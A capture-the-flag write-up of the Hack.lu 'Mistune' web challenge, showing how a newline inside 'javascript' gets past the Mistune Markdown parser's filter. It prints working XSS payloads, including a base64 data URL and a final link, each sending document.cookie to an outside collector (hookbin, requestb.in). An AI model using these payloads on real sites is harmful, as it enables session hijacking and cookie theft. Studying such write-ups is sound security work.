# [HACK.LU-CTF] Mistune (Web)
##### **Description :** Markdown parsers are fun. Now click here and steal the cookie!

In this challenge, we have two forms to submit Markdown code that is parsed by Mistune.
The first form is for testing purposes and the second one's sent contents are read by an admin bot which has the flag in it's cookies.

In markdown syntax, we can create a XSS payload by using the link creation directive :
```javascript
[mylink](https://www.google.com)
[xss](javascript:alert`1`)
```

Mistune parser filters out the **javascript:** token. We need to find a way to bypass this filter to get a working XSS payload.
To do so, we try to use **data:text/html** but it only works on Firefox browser.
```javascript
[click](data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSAiaHR0cHM6Ly9ob29rYmluLmNvbS9iaW4vdkRrWDlyanc/YWRtaW5fY29va2llPSIrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+)
```

We found some bypasses on Mistune's github [Issue#87](https://github.com/lepture/mistune/issues/87) but they are inefficient since the parser is up-to-date.
 
After many trials and errors, we came up with a filter bypass! The mighty newline character **\n** !
It's stripped out by the browser thus leading to a working XSS payload.
```javascript
[xss](javascript
:document.location="https://requestb.in/XXXXXXX?fckadmins="+document.cookie)
```

Boom! We got the flag!